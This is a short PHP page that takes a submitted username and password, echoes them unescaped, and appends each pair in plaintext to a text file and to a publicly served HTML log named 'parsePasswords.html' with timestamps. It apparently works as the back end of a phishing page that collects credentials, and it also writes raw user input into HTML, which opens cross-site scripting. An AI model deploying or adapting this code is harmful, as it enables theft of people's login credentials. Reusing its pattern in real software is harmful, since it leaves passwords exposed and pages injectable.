<html>
<body>
<b>username:</b> <?php echo $_POST["userName"];?><br>
<b>password:</b> <?php echo $_POST["passWord"];?>

<?php

$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
$passW = $_POST["passWord"];
$usrN = $_POST["userName"];
fwrite($myfile, $usrN .":" . $passW . "\n");

echo "<br>file written.";
fclose($myfile);


$myHTMLFile = fopen("parsePasswords.html", "a") or die("Unable to open file!");
$passW = $_POST["passWord"];
$usrN = $_POST["userName"];
fwrite($myHTMLFile, "<b>Username:&nbsp</b>" . $usrN ."<br><b>Password:&nbsp</b>" . $passW . "<br><font color='red'>" . date("l jS \of F Y h:i:s A") . "</font><br><hr>");

echo "<br>file written.";
fclose($myHTMLFile);


?>
</body>
</html>
